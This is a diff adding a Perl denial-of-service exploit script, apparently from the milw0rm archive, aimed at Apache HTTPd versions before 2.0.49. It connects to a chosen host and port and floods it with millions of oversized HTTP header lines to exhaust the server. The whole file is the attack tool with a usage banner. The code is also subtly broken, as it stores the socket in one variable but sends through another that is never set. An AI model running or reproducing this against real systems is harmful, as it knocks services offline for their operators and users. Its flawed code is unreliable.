@@ -1,0 +1,54 @@
+#/usr/bin/perl -w
+
+use IO::Socket::INET;
+
+usage() unless (@ARGV == 2);
+my $host = shift(@ARGV);
+my $port = shift(@ARGV);
+
+sub usage
+{
+print "\n***********************************************";
+print "\n Apache HTTPd Arbitrary Long HTTP Headers DoS \n";
+print " Tested Versions : 2 < 2.0.49 \n";
+print " Adv : http://www.guninski.com/httpd1.html \n";
+print " By  : Qnix ,  Q-nix[at]hotmail[dot]com \n";
+print "***********************************************\n\n";
+print "Usage: apache_ap_get_dos.pl [Host] [Port]\n\n";
+exit(1);
+}
+
+my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$host,
+PeerPort=>$port);
+$socket or die "Cannot connect to the host.\n";
+
+binmode($sock);
+
+$hostname="Host: $host";
+
+$buf2='A'x50;
+$buf4='A'x8183;
+
+$len=length($buf2);
+
+$buf="GET / HTTP/1.1\r\n";
+
+send($sock,$buf,0) || die "send error:$@\n";
+for($i= 0; $i < 2000000; $i++)
+{
+   $buf=" $buf4\r\n";
+   send($sock,$buf,0) || die "send error:$@, target maybe have been
+DoS?\n";
+}
+
+$buf="$hostname\r\n";
+$buf.="Content-Length: $len\r\n";
+
+$buf.="\r\n";
+$buf.=$buf2."\r\n\r\n";
+
+send($sock,$buf,0) || die "send error:$@\n";
+print "Ok, the buffer sent to the target \n";
+close($sock);
+
+# milw0rm.com [2005-06-20]
